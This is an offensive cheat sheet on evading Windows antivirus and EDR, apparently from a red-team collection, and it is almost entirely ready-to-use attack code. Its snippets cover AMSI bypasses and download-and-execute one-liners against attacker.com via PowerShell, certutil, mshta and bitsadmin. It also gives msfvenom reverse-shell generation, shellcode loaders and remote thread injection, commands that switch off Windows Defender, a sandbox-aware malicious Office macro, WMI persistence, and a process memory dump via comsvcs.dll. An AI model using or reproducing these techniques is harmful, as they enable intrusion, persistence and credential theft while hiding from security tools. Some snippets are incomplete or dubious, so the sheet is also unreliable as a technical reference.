# Windows Evasion (AV/EDR)

## PowerShell AMSI Bypass

### Reflection-based Bypass

```powershell
# Disable AMSI by patching AmsiScanBuffer
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Execute malicious code after bypass
Invoke-Expression (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')
```

### Environment Variable Bypass

```powershell
# Set environment to avoid AMSI triggers
$env:AMSI_ENABLED = $false
$env:COMPLUS_Profiling_Enabled = 1
$env:COMPLUS_Profiler = "C:\path\to\bypass.dll"
```

### Matt Graeber's Bypass (Older)

```powershell
# Register new WMI event to execute code
Register-WmiEvent -Action {powershell -NoP -NonI -W Hidden -C "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell')"} -EventFilter @{EventType=32} -SourceIdentifier wmi_update
```

## Payload Obfuscation

### String Encoding

```powershell
# Base64 encode command
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('Write-Host "Hello"'))

# Execute
powershell -EncodedCommand <BASE64_STRING>
```

### Split & Reconstruct

```powershell
# Split suspicious string
$str = "I" + "E" + "X"  # Reconstructs to IEX
& $str (New-Object Net.WebClient).DownloadString('...')
```

### Variable Concatenation

```powershell
$cmd = "I" + "E" + "X"
$url = "htt" + "p://attacker.com/shell"
& $cmd (New-Object Net.WebClient).DownloadString($url)
```

### Hex Encoding

```powershell
# Encode payload in hex
$payload = "powershell -Command IEX (...)"
$hex = [System.Text.Encoding]::UTF8.GetBytes($payload) | ForEach-Object { $_.ToString('X2') }

# Decode and execute
$decoded = -join ($hex | ForEach-Object { [char][int]"0x$_" })
Invoke-Expression $decoded
```

## Executable Obfuscation

### UPX Packing

```bash
# Compress executable to evade pattern detection
upx -9 payload.exe -o payload_packed.exe

# Most AV won't detect packed binaries on first execution
```

### Shikata Ga Nai (Metasploit Encoder)

```bash
# Generate encoded payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 \
  -e x86/shikata_ga_nai -i 10 -o payload.exe
# -i 10 = iterate 10 times for better obfuscation
```

### Custom XOR Encryption

```c
// C program to XOR-encrypt payload
#include <stdio.h>

unsigned char payload[] = {
    // Encrypted shellcode bytes
};

int main() {
    unsigned char key = 0x42;
    for (int i = 0; i < sizeof(payload); i++) {
        payload[i] ^= key;
    }
    // Execute payload
    ((void(*)())payload)();
}
```

## Process Injection & Hollowing

### Remote Thread Injection (C)

```c
// Inject shellcode into remote process
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, target_pid);
LPVOID lpBuffer = VirtualAllocEx(hProcess, NULL, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, lpBuffer, shellcode, shellcode_size, NULL);
CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, 0, NULL);
```

### Process Hollowing (PowerShell)

```powershell
# Replace image of suspended process with malicious one
$procInfo = New-Object System.Diagnostics.ProcessStartInfo
$procInfo.FileName = "C:\Windows\System32\notepad.exe"
$procInfo.UseShellExecute = $false
$process = [System.Diagnostics.Process]::Start($procInfo)

# Suspend and inject shellcode
# (Simplified; real implementation more complex)
```

## Defense Evasion Techniques

### Disable Windows Defender

```powershell
# Disable real-time protection
Set-MpPreference -DisableRealtimeMonitoring $true

# Exclude path from scanning
Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# Disable cloud protection
Set-MpPreference -MAPSReporting Disabled
```

### CLR/DotNet Abuse

```powershell
# Execute inline C# without compiling to disk
$code = @"
using System;
public class Exploit {
    public static void Main() {
        System.Diagnostics.Process.Start("calc.exe");
    }
}
"@

$compiler = New-Object Microsoft.CSharp.CSharpCodeProvider
$compiler.CompileAssemblyFromSource([System.CodeDom.Compiler.CompilerParameters]::new(), $code)
```

### Office Macro Evasion

```vba
' VBA macro in Excel/Word
Sub Document_Open()
    ' Check if running in AV sandbox
    If Dir("C:\analysis") = "" Then
        Shell ("powershell -Command IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell')")
    End If
End Sub
```

### WMI Event Subscriptions

```powershell
# Create persistent WMI trigger (survives reboot)
$query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
Register-WmiEvent -Query $query -Action {
    Invoke-WebRequest -Uri http://attacker.com/shell -OutFile C:\Temp\shell.ps1
    powershell -File C:\Temp\shell.ps1
} -SourceIdentifier persistence
```

## Living-off-the-Land (LOLBins)

```powershell
# Execute PowerShell via certutil
certutil -urlcache -split -f http://attacker.com/shell.ps1 C:\Temp\shell.ps1
powershell -File C:\Temp\shell.ps1

# Use mshta (HTML Application)
mshta.exe "http://attacker.com/shell.hta"

# Use rundll32 for execution
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <PID> C:\out.dmp full

# bitsadmin download
bitsadmin /transfer myJob /download /resume http://attacker.com/shell.exe C:\Temp\shell.exe
Start-Process C:\Temp\shell.exe
```

## Sandbox Evasion

### Check for Analysis Environment

```powershell
# Detect VirtualBox
if (Get-WmiObject -ClassName Win32_SystemEnclosure | Where-Object { $_.Manufacturer -like "*VirtualBox*" }) {
    exit
}

# Detect Hyper-V
if ((Get-WmiObject -Class Win32_ComputerSystem).Manufacturer -like "*Microsoft Corporation*") {
    exit
}

# Check for analysis tools
if (Test-Path "C:\Tools\*") {
    exit
}

# Check for domain (sandboxes often not joined)
if ((Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain -eq $false) {
    exit
}

# Proceed if all checks pass
# [malicious code here]
```

---

<div align="center">

*Part of the [D4RKGUNN3R Cheatsheets](./README-CHEATSHEETS.md) collection.*

</div>
